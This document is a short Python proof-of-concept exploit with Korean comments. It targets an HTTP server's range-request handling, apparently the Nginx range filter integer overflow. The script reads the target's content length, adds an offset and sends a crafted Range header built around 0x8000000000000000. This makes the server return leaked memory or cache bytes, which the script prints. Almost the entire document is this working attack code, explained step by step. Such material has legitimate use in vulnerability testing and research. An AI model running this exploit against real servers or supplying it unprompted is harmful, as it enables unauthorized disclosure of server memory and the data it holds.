#!/usr/bin/env python
import sys
import requests

# 사용자로부터 입력받은 URL의 인자 개수를 확인
if len(sys.argv) < 2:
    # 사용 방법을 출력
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()  # 인자가 부족할 경우 프로그램 종료

# HTTP 요청에 사용할 헤더 설정
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}

offset = 605  # 오프셋 값 설정
url = sys.argv[1]  # 사용자로부터 입력받은 URL
file_len = len(requests.get(url, headers=headers).content)  # URL의 내용 길이를 가져옴

# Range 헤더를 설정하여 취약점을 이용
n = file_len + offset
headers["Range"] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)

# 설정된 헤더로 URL에 요청을 보냄
r = requests.get(url, headers=headers)
print(r.text)  # 응답 내용 출력
